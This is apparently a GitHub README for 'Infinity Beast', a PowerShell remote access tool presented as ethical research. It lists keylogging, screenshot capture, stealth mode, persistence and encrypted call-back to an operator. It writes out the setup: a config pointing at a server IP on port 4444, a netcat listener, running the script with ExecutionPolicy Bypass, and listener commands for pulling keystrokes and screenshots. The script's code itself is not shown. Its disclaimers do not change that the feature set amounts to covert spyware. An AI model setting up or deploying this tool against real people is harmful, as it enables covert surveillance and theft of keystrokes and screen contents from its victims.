# üîí Infinity Beast: Ethical Cybersecurity Research Tool

![Infinity Beast](https://i.ibb.co/dsYhDVwY/logo.jpg) <!-- Placeholder for a logo -->

Infinity Beast is an ethical cybersecurity research tool designed to demonstrate remote system interaction techniques for **penetration testing, ethical hacking, and security analysis**. It is intended for educational use by **ethical hackers, cybersecurity students, and researchers** to understand remote access mechanisms in a controlled and legal environment.

üö® **Disclaimer**: This tool is for legal and ethical use only. Unauthorized use on systems without explicit permission is illegal and strictly prohibited.

---

## üõ† Features
- **Remote System Interaction**: Learn how remote administration works in security testing.
- **Keystroke Logging (Forensic Analysis)**: Demonstrates keyboard event tracking.
- **Screenshot Capture (Security Audits)**: Enables visual system monitoring.
- **Stealth Mode (Research on Evasion Techniques)**: Helps understand evasion tactics.
- **Encrypted Communication**: Implements AES-based encrypted data exchange.
- **Persistence (Defense Analysis)**: Simulates real-world persistence mechanisms.
- **Configurable Server**: Fetches dynamic settings from a hosted configuration file.

---

## ‚öôÔ∏è Prerequisites

Before using Infinity Beast for ethical research, ensure the following:
- A **test machine** for execution (e.g., a Virtual Machine in a sandboxed environment).
- **Netcat or a similar listener tool** for capturing data streams.
- **Legal authorization** to conduct security research on the target system.

## üöÄ Installation & Setup

### Step 1: Clone the Repository
```sh
git clone https://github.com/RSRSECURITY/Infinity-Beast.git
cd Infinity-Beast
```

### Step 2: Verify the Configuration File
Check the `config.txt` file for the correct settings:
```
[SERVER_IP]:4444::SecureKey123!
```

### Step 3: Install Netcat (Listener)
#### **For Linux/macOS**
```sh
sudo apt update && sudo apt install netcat -y
nc -lvp 4444
```

#### **For Windows**
1. Download Netcat from [JonCraton‚Äôs Netcat Page](https://joncraton.org/files/nc111nt.zip).
2. Extract the ZIP file to `C:\Netcat`.
3. Open `cmd` and navigate to the folder:
   ```sh
   cd C:\Netcat
   nc -lvp 4444
   ```

### Step 4: Run the Research Script
Ensure you have permission before running the script on a test system:
```sh
powershell -ExecutionPolicy Bypass -File infinity_beast.ps1
```

## üéÆ Usage Guide

Once connected, execute commands from the listener:

| **Command**       | **Description**                               |
|-------------------|---------------------------------------------|
| `keylog`         | Retrieves captured keystrokes.               |
| `screenshot`     | Captures and sends a Base64-encoded image.  |
| `stealth`        | Enables stealth mode (research purposes).    |
| `exit`           | Terminates the session.                      |

To **decode screenshots**, use a Base64 converter like:
- [Base64 Image Converter](https://www.base64-image.de/)

## üîç Ethical Considerations

- **Use only in environments where you have explicit authorization.**
- **Do not deploy on production systems without consent.**
- **Follow ethical hacking guidelines and legal frameworks.**
- **Always notify system owners and seek approval before conducting tests.**

For professional penetration testing, consider industry-standard tools such as:
- [Metasploit Framework](https://www.metasploit.com/)
- [Empire Project](https://github.com/EmpireProject)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

---

## üõ°Ô∏è Troubleshooting

**1Ô∏è‚É£ No Connection to the Server**
- Ensure Netcat is listening (`nc -lvp 4444`).
- Check firewall settings (allow port `4444`).
- Verify the `config.txt` file is correctly formatted.

**2Ô∏è‚É£ Script Not Executing**
- Try running PowerShell as Administrator.
- Check if the Execution Policy allows scripts:
  ```sh
  Set-ExecutionPolicy Bypass -Scope Process -Force
  ```

**3Ô∏è‚É£ Decryption Errors**
- Ensure encryption keys match in both the script and `config.txt`.
